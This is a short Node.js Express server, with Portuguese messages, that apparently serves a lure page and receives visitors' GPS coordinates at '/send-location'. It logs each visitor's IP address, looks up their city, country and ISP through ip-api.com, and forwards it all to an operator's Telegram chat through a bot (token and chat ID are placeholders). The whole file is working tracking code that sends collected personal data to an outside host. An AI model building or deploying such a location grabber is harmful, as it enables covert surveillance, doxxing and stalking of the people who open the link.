const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = "Seu Token";
const TELEGRAM_CHAT_ID = "Seu ID";

app.set('trust proxy', true);

async function enrichIP(ip) {
  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    return data;
  } catch (error) {
    console.error("Erro ao obter detalhes do IP:", error.message);
    return {};
  }
}

app.post("/send-location", async (req, res) => {
  const { latitude, longitude } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip;
  const ipInfo = await enrichIP(ip);

  const message = `
📍 Localização Recebida:
Latitude: ${latitude || "Não obtida"}
Longitude: ${longitude || "Não obtida"}

🌐 IP: ${ip}
🏙 Cidade: ${ipInfo.city || "N/A"}
🏳 País: ${ipInfo.country || "N/A"}
📡 Provedor: ${ipInfo.isp || "N/A"}
  `;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error.message);
    res.status(500).json({ success: false });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando...");
});
